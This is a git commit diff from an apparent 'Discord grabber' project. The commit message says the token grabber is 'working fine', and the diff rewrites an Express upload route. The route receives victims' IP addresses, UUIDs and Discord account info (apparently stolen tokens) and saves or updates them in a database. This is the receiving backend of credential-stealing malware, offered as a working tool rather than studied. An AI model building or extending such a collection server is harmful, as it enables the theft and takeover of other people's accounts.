501ee7bbb69a4abcf96f99945c55d63a1d2c4f65
PaulDotSH <84643540+PaulDotSH@users.noreply.github.com>
2021-09-09 06:25:08 -0700

    Discord grabber
    Initial release, with discord token grabber working fine

--- routes/upload.js
+++ routes/upload.js
@@ -11,41 +11,68 @@ router.get("/", (req, res) => {
 
 //TODO: Add only if user doesnt exist or user exists and the details sent dont
 //(if user exists and has discord details but you send browser details add them)
-router.post("/", (req, res) => {
-  console.log(req.body);
-  if (
-    Object.keys(req.body.IP).length === 0 ||
-    Object.keys(req.body.UUID).length === 0
-  ) {
+router.post("/", async (req, res) => {
+  //console.log(req.body);
+  console.log(
+    `IP: ${checkParam(req.body.IP)} UUID: ${checkParam(
+      req.body.UUID
+    )} DisInfo: ${checkParam(req.body.discordInfo)}`
+  );
+  if (!checkParam(req.body.IP) || !checkParam(req.body.UUID)) {
     res.send("ok");
     return;
   }
 
-  const user = new User({
-    UUID: req.body.UUID,
-    IP: req.body.IP,
-  });
-  let save = false;
-
-  if (checkParam(req.body.discordInfo)) {
-    user.discordInfo = req.body.discordInfo;
-    save = true;
-  }
-
-  if (!save) {
-    res.send("ok");
-    return;
-  }
-
-  user
-    .save()
-    .then((data) => {
-      res.json(data);
-    })
-    .catch((err) => {
-      console.log("Err: " + err);
-      res.json(err);
+  const foundUser = await User.findOne({ UUID: req.body.UUID });
+  console.log(foundUser);
+  //If user is found, check for params and update missing info if possible
+  if (foundUser) {
+    console.log("user exists");
+    if (checkParam(req.body.discordInfo) && !foundUser.discordInfo) {
+      try {
+        console.log("updating user");
+        const updatedUser = await User.updateOne(
+          { UUID: req.body.UUID },
+          { $set: { discordInfo: req.body.discordInfo } }
+        );
+        res.sendStatus(200);
+      } catch (err) {
+        console.log(
+          `Error ${err} when updating user with UUID: ${req.body.UUID}`
+        );
+        res.sendStatus(500);
+      }
+    }
+  } else {
+    //Add the user to the DB
+    const user = new User({
+      UUID: req.body.UUID,
+      IP: req.body.IP,
     });
+    let save = false;
+
+    if (checkParam(req.body.discordInfo)) {
+      user.discordInfo = req.body.discordInfo;
+      save = true;
+    }
+    //Add checks for other stuff like browserInfo
+
+    if (!save) {
+      res.send("ok");
+      return;
+    }
+
+    user
+      .save()
+      .then((data) => {
+        res.json(data);
+      })
+      .catch((err) => {
+        console.log("Err: " + err);
+        res.json(err);
+      });
+  }
+  console.log(`FoundUser: ${foundUser}`);
 });
 
 function checkParam(p) {
